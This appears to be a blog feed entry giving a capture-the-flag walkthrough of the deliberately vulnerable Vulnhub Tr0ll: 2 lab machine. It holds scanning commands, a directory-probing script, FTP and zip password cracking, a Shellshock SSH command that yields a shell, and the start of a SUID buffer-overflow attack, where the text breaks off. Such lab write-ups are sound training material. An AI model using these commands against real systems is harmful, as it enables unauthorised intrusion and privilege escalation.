@@ -1,0 +1,1074 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: bof | F4l13n5n0w]]></title>
+  <link href="http://f4l13n5n0w.github.io/blog/categories/bof/atom.xml" rel="self"/>
+  <link href="http://f4l13n5n0w.github.io/"/>
+  <updated>2017-04-08T06:55:00-04:00</updated>
+  <id>http://f4l13n5n0w.github.io/</id>
+  <author>
+    <name><![CDATA[F4l13n5n0w]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[[Vulnhub]Tr0ll: 2]]></title>
+    <link href="http://f4l13n5n0w.github.io/blog/2015/06/24/vulnhub-tr0ll-2/"/>
+    <updated>2015-06-24T04:31:06-04:00</updated>
+    <id>http://f4l13n5n0w.github.io/blog/2015/06/24/vulnhub-tr0ll-2</id>
+    <content type="html"><![CDATA[<p>&ldquo;The next machine in the Tr0ll series of VMs. This one is a step up in difficulty from the original Tr0ll but the time required to solve is approximately the same, and make no mistake, trolls are still present! :) Difficulty is beginner++ to intermediate.&rdquo; &ndash; <a href="www.overflowsecurity.com">Maleus</a></p>
+
+<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/tr0ll-2,107/">here</a>.</p>
+
+<!-- more -->
+
+
+<h2>Attacker &amp; Target</h2>
+
+<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>
+
+<p>Target: TopHatSec: Freshly (<em>10.10.10.141/24</em>)</p>
+
+<h2>Vulnerability &amp; Exploit</h2>
+
+<ul>
+<li>Found hidden information in picture</li>
+<li>Weak passwords used in FTP, login and download suspect encrypted zip file</li>
+<li>Cracked the zip file with downloaded dictionary file and found user &lsquo;noob&rsquo; and his SSH private key file</li>
+<li>Shellshock bug give attacker a way to break in</li>
+<li>Buffer Overflow analysis and exploit to get ROOT</li>
+</ul>
+
+
+<h2>Method</h2>
+
+<ul>
+<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
+<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
+<li>Web application vulnerability scanned to discover any web vulnerability [<font color="FF8000">nikto</font>]</li>
+<li>Analysis and write script to check folder list found in &lsquo;robots.txt&rsquo;</li>
+<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
+<li>Download picture from four different folders and reveal the hidden information stored in one of the pictures</li>
+<li>Found the hidden folder and download a base64 encoded file from it, after decoded it, that should be a dictionary file</li>
+<li>Try the weak passwords for FTP login and found one works (Tr0ll / Tr0ll)</li>
+<li>Downloaded encrypted zip file through FTP and crack it with dictionary file found before [<font color="FF8000">fcrackzip</font>]</li>
+<li>Exploit shellshock bug with noob&rsquo;s private key file to break into the target machine</li>
+<li>Look around and found suspicious program with SUID bit set under the path &lsquo;/nothing_to_see_here/choose_wisely/&rsquo;</li>
+<li>Analysis and work out PoC to exploit BoF vulnerability in the target program to get ROOT</li>
+</ul>
+
+
+<h2>Tools</h2>
+
+<p>All the tools used here can be found in Kali Linux</p>
+
+<ul>
+<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
+<li><a href="https://nmap.org/">nmap</a></li>
+<li><a href="https://cirt.net/Nikto2">nikto</a></li>
+<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
+<li><a href="http://oldhome.schmorp.de/marc/fcrackzip.html">fcrackzip</a></li>
+</ul>
+
+
+<h2>Walkthrough</h2>
+
+<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.141 in this case).</p>
+
+<p><img class="left" src="/downloads/Tr0ll2/1.png"></p>
+
+<p>10.10.10.141 is our Target!</p>
+
+<p>Then run NMAP scan to detect opening ports/running services on the target. From the result, TCP port 21, 22 and 80 have been discovered running on Ubuntu Linux.
+<code>nmap -sV -v -O -A -T5 -p- 10.10.10.141</code></p>
+
+<p><img class="left" src="/downloads/Tr0ll2/2.png"></p>
+
+<p>Next, I run nikto scan on port 80 to check if there is any web vulnerability.</p>
+
+<p><img class="left" src="/downloads/Tr0ll2/3.png"></p>
+
+<p>Nothing too exciting, but noticed that <code>robots.txt</code> found without <code>disallow</code> which is odd. As a result, I open iceweasel browser to have a close look at robots.txt.</p>
+
+<p><img class="left" src="/downloads/Tr0ll2/4.png"></p>
+
+<p>Here I wrote a python script to check all of the directories in <code>robots.txt</code> and filter out working directories then saved in a file.</p>
+
+<p><figure class='code'><figcaption><span>robot_check.py  (robot_check.py)</span> <a href='/downloads/code/robot_check.py'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">httplib</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">urllib2</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&#39;10.10.10.141&#39;</span>
+</span><span class='line'><span class="n">img_name</span> <span class="o">=</span> <span class="s">&#39;cat_the_troll.jpg&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># read URIs found in robots.txt</span>
+</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;robots.txt&#39;</span><span class="p">,</span><span class="s">&#39;r&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">uri_list</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">uri_to_check</span> <span class="o">=</span> <span class="p">[]</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&#39;[*] Start checking ...&#39;</span>
+</span><span class='line'><span class="k">for</span> <span class="n">uri</span> <span class="ow">in</span> <span class="n">uri_list</span><span class="p">:</span>
+</span><span class='line'>	<span class="n">conn</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
+</span><span class='line'>	<span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s">&#39;GET&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">uri</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;/&#39;</span><span class="p">))</span>
+</span><span class='line'>	<span class="n">response</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'>	<span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status</span> <span class="o">!=</span> <span class="mi">404</span><span class="p">:</span>							<span class="c"># filter error code 404 to make the result nice and tidy</span>
+</span><span class='line'>		<span class="k">print</span> <span class="s">&#39;[+] &#39;</span> <span class="o">+</span> <span class="n">uri</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;/&#39;</span>
+</span><span class='line'>		<span class="k">print</span> <span class="s">&#39;[-] &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status</span><span class="p">)</span>
+</span><span class='line'>		<span class="n">uri_to_check</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">&#39;http://&#39;</span> <span class="o">+</span> <span class="n">ip</span> <span class="o">+</span> <span class="n">uri</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;/&#39;</span> <span class="o">+</span> <span class="n">img_name</span><span class="p">)</span>	<span class="c"># if the response code is not 404 then put in uri_to_check list for further analysis</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># save under inspection URIs to file for further analysis</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&#39;[*] Saving result to file: uris_to_check.txt&#39;</span>
+</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;uris_to_check.txt&#39;</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="k">for</span> <span class="n">uri</span> <span class="ow">in</span> <span class="n">uri_to_check</span><span class="p">:</span>
+</span><span class='line'>	<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">uri</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&#39;[*] Done!&#39;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><img class="left" src="/downloads/Tr0ll2/5.png"></p>
+
+<p>Four directories gave 200 code response. Then I use <code>wget</code> with <code>-i</code> switch to download pictures from each directory.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# wget -i uris_to_check.txt
+</span><span class='line'>&ndash;2015-06-23 06:19:05&ndash;  &lt;a href="http://10.10.10.141/noob/cat_the_troll.jpg">http://10.10.10.141/noob/cat_the_troll.jpg&lt;/a>
+</span><span class='line'>Connecting to 10.10.10.141:80&hellip; connected.
+</span><span class='line'>HTTP request sent, awaiting response&hellip; 200 OK
+</span><span class='line'>Length: 15831 (15K) [image/jpeg]
+</span><span class='line'>Saving to: `cat_the_troll.jpg'&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>100%[====================================================================================================================>] 15,831      &ndash;.-K/s   in 0s&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>2015-06-23 06:19:05 (169 MB/s) - `cat_the_troll.jpg' saved [15831/15831]&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&ndash;2015-06-23 06:19:05&ndash;  &lt;a href="http://10.10.10.141/keep_trying/cat_the_troll.jpg">http://10.10.10.141/keep_trying/cat_the_troll.jpg&lt;/a>
+</span><span class='line'>Reusing existing connection to 10.10.10.141:80.
+</span><span class='line'>HTTP request sent, awaiting response&hellip; 200 OK
+</span><span class='line'>Length: 15831 (15K) [image/jpeg]
+</span><span class='line'>Saving to: `cat_the_troll.jpg.1'&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>100%[====================================================================================================================>] 15,831      &ndash;.-K/s   in 0s&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>2015-06-23 06:19:05 (89.2 MB/s) - `cat_the_troll.jpg.1' saved [15831/15831]&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&ndash;2015-06-23 06:19:05&ndash;  &lt;a href="http://10.10.10.141/dont_bother/cat_the_troll.jpg">http://10.10.10.141/dont_bother/cat_the_troll.jpg&lt;/a>
+</span><span class='line'>Reusing existing connection to 10.10.10.141:80.
+</span><span class='line'>HTTP request sent, awaiting response&hellip; 200 OK
+</span><span class='line'>Length: 15873 (16K) [image/jpeg]
+</span><span class='line'>Saving to: `cat_the_troll.jpg.2'&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>100%[====================================================================================================================>] 15,873      &ndash;.-K/s   in 0s&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>2015-06-23 06:19:05 (175 MB/s) - `cat_the_troll.jpg.2' saved [15873/15873]&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&ndash;2015-06-23 06:19:05&ndash;  &lt;a href="http://10.10.10.141/ok_this_is_it/cat_the_troll.jpg">http://10.10.10.141/ok_this_is_it/cat_the_troll.jpg&lt;/a>
+</span><span class='line'>Reusing existing connection to 10.10.10.141:80.
+</span><span class='line'>HTTP request sent, awaiting response&hellip; 200 OK
+</span><span class='line'>Length: 15831 (15K) [image/jpeg]
+</span><span class='line'>Saving to: `cat_the_troll.jpg.3'&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>100%[====================================================================================================================>] 15,831      &ndash;.-K/s   in 0s&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>2015-06-23 06:19:05 (36.5 MB/s) - `cat_the_troll.jpg.3' saved [15831/15831]&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>FINISHED &ndash;2015-06-23 06:19:05&ndash;
+</span><span class='line'>Total wall clock time: 0.02s
+</span><span class='line'>Downloaded: 4 files, 62K in 0.001s (79.6 MB/s)
+</span><span class='line'>root@kali:~/tr0ll2# ls -alh
+</span><span class='line'>total 84K
+</span><span class='line'>drwxr-xr-x  2 root root 4.0K Jun 23 06:19 .
+</span><span class='line'>drwxr-xr-x 39 root root 4.0K Jun 23 04:58 ..
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  16K Oct  4  2014 cat_the_troll.jpg
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  16K Oct  4  2014 cat_the_troll.jpg.1
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  16K Oct  4  2014 cat_the_troll.jpg.2
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  16K Oct  4  2014 cat_the_troll.jpg.3
+</span><span class='line'>-rwxr-xr-x  1 root root  927 Jun 23 06:18 robot_check.py
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  323 Jun 23 05:10 robots.txt
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  195 Jun 23 06:18 uris_to_check.txt</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Next I use <code>strings</code> to check each downloaded picture to find hidden information.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# strings cat_the_troll.jpg.2
+</span><span class='line'>JFIF&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>3-652-108?QE8&lt;M=01F`GMTV[[7DcjcXjQY[W&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>)W:1:WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+</span><span class='line'>&ldquo;aq2
+</span><span class='line'>&hellip; &hellip; truncated &hellip; &hellip;
+</span><span class='line'>]=%em;
+</span><span class='line'>lj\p
+</span><span class='line'>*/ p?E$
+</span><span class='line'>Look Deep within y0ur_self for the answer</span></code></pre></td></tr></table></div></figure></p>
+
+<p><code>y0ur_self</code> looks like another hidden directory on the server.</p>
+
+<p><img class="left" src="/downloads/Tr0ll2/6.png"></p>
+
+<p>Found <code>answer.txt</code> file which the content looks like encoded by base64. Then I decoded and save to file <code>answer2.txt</code>.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# cat answer.txt | base64 &ndash;decode > answer2.txt</span></code></pre></td></tr></table></div></figure></p>
+
+<p>This file is more like a dictionary file and will be useful later.</p>
+
+<h3>FTP &amp; ZIP Crack</h3>
+
+<p>Now let&rsquo;s move to FTP service.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ftp 10.10.10.141
+</span><span class='line'>Connected to 10.10.10.141.
+</span><span class='line'>220 Welcome to Tr0ll FTP&hellip; Only noobs stay for a while&hellip;
+</span><span class='line'>Name (10.10.10.141:root): anonymous
+</span><span class='line'>331 Please specify the password.
+</span><span class='line'>Password:
+</span><span class='line'>530 Login incorrect.
+</span><span class='line'>Login failed.
+</span><span class='line'>ftp> bye
+</span><span class='line'>221 Goodbye.</span></code></pre></td></tr></table></div></figure></p>
+
+<p>I firstly tried <code>anonymous</code> user to login but failed. After checking the MOTD message and used <code>Tr0ll / Tr0ll</code> as login credential, I logged in successfully.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ftp 10.10.10.141
+</span><span class='line'>Connected to 10.10.10.141.
+</span><span class='line'>220 Welcome to Tr0ll FTP&hellip; Only noobs stay for a while&hellip;
+</span><span class='line'>Name (10.10.10.141:root): Tr0ll
+</span><span class='line'>331 Please specify the password.
+</span><span class='line'>Password:
+</span><span class='line'>230 Login successful.
+</span><span class='line'>Remote system type is UNIX.
+</span><span class='line'>Using binary mode to transfer files.
+</span><span class='line'>ftp> ls
+</span><span class='line'>200 PORT command successful. Consider using PASV.
+</span><span class='line'>150 Here comes the directory listing.
+</span><span class='line'>-rw-r&ndash;r&ndash;    1 0        0            1474 Oct 04  2014 lmao.zip
+</span><span class='line'>226 Directory send OK.
+</span><span class='line'>ftp> get lmao.zip
+</span><span class='line'>local: lmao.zip remote: lmao.zip
+</span><span class='line'>200 PORT command successful. Consider using PASV.
+</span><span class='line'>150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
+</span><span class='line'>226 Transfer complete.
+</span><span class='line'>1474 bytes received in 0.00 secs (5272.7 kB/s)
+</span><span class='line'>ftp> bye
+</span><span class='line'>221 Goodbye.</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Here I found a zip file. After I downloaded it and trying to unzip the lmao.zip, it was asking for password&hellip;</p>
+
+<p>Next I try to crack the zip password with the dictionary file found before.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# fcrackzip -v -D -u -p ~/tr0ll2/answer2.txt lmao.zip
+</span><span class='line'>found file &lsquo;noob&rsquo;, (size cp/uc   1300/  1679, flags 9, chk 1005)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL</span></code></pre></td></tr></table></div></figure></p>
+
+<p>fcrackzip will found the password in seconds! Now I get in the lmao directory and found noob&rsquo;s SSH key file.</p>
+
+<h3>SSH &amp; Shellshock</h3>
+
+<p>Firstly, I tried to SSH login with noob&rsquo;s key file directly but failed. It looks like there is something command run forced.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2/lmao# ssh -i noob &lt;a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x6e;&#x6f;&#111;&#98;&#x40;&#49;&#x30;&#x2e;&#x31;&#x30;&#x2e;&#x31;&#x30;&#x2e;&#49;&#52;&#x31;">&#110;&#111;&#x6f;&#98;&#x40;&#x31;&#x30;&#x2e;&#x31;&#48;&#46;&#x31;&#x30;&#x2e;&#x31;&#52;&#x31;&lt;/a>
+</span><span class='line'>The authenticity of host &lsquo;10.10.10.141 (10.10.10.141)&rsquo; can&rsquo;t be established.
+</span><span class='line'>ECDSA key fingerprint is 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96.
+</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
+</span><span class='line'>Warning: Permanently added &lsquo;10.10.10.141&rsquo; (ECDSA) to the list of known hosts.
+</span><span class='line'>TRY HARDER LOL!
+</span><span class='line'>Connection to 10.10.10.141 closed.</span></code></pre></td></tr></table></div></figure></p>
+
+<p>By searching in google, I found <em>shellshock</em> bug will help to bypass this and make commands execute. For more details about how to exploit SSH via exploiting <em>shellshock</em> vulnerability, please check: <a href="http://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh">here</a> and <a href="http://bloggars-online.blogspot.ca/2014/10/bash-shellshock-ssh-exploit.html">here</a></p>
+
+<p>So I tried the following command and it works!</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2/lmao# ssh -i noob &lt;a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#110;&#111;&#x6f;&#98;&#x40;&#x31;&#x30;&#x2e;&#49;&#x30;&#x2e;&#x31;&#48;&#x2e;&#49;&#x34;&#x31;">&#110;&#x6f;&#x6f;&#98;&#64;&#x31;&#x30;&#x2e;&#x31;&#x30;&#x2e;&#49;&#x30;&#x2e;&#x31;&#x34;&#49;&lt;/a> &lsquo;() { :;}; /bin/bash&rsquo;
+</span><span class='line'>id
+</span><span class='line'>uid=1002(noob) gid=1002(noob) groups=1002(noob)
+</span><span class='line'>python -c &ldquo;import pty; pty.spawn(&lsquo;/bin/bash&rsquo;)&rdquo;
+</span><span class='line'>noob@Tr0ll2:~$ id
+</span><span class='line'>id
+</span><span class='line'>uid=1002(noob) gid=1002(noob) groups=1002(noob)
+</span><span class='line'>noob@Tr0ll2:~$ pwd
+</span><span class='line'>pwd
+</span><span class='line'>/home/noob</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Now I have already broken into the shell.</p>
+
+<p>By poking around in the file system, I found three &lsquo;door&rsquo; files under <code>/nothing_to_see_here/choose_wisely/</code>. There is <code>r00t</code> file in each door folder and they will change every couple of minutes.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls -al *
+</span><span class='line'>ls -al *
+</span><span class='line'>door1:
+</span><span class='line'>total 16
+</span><span class='line'>drwsr-xr-x 2 root root 4096 Oct  4  2014 .
+</span><span class='line'>drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
+</span><span class='line'>-rwsr-xr-x 1 root root 7271 Oct  4  2014 r00t&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>door2:
+</span><span class='line'>total 20
+</span><span class='line'>drwsr-xr-x 2 root root 4096 Oct  5  2014 .
+</span><span class='line'>drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
+</span><span class='line'>-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>door3:
+</span><span class='line'>total 16
+</span><span class='line'>drwsr-xr-x 2 root root 4096 Oct  5  2014 .
+</span><span class='line'>drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
+</span><span class='line'>-rwsr-xr-x 1 root root 7273 Oct  5  2014 r00t</span></code></pre></td></tr></table></div></figure></p>
+
+<p>After several trial and error, I found the <code>r00t</code> file with biggest size is the target which is vulnerable to buffer overflow.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t $(python -c &lsquo;print &ldquo;A&rdquo; * 500&rsquo;)
+</span><span class='line'>&lt;_here/choose_wisely/door1$ ./r00t $(python -c &lsquo;print &ldquo;A&rdquo; * 500&rsquo;)          &lt;br/>
+</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Aha, <code>Segmentation fault</code> looks good so far. Then I upload <code>checksec.sh</code> script to check protections.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./checksec.sh &ndash;file r00t
+</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+</span><span class='line'>Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   r00t</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Great, nearly no protection. Now it&rsquo;s time to move on to find and overflow the EIP.</p>
+
+<p>Firstly, I use <code>pattern_create.rb</code> to generate 500 unique strings:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
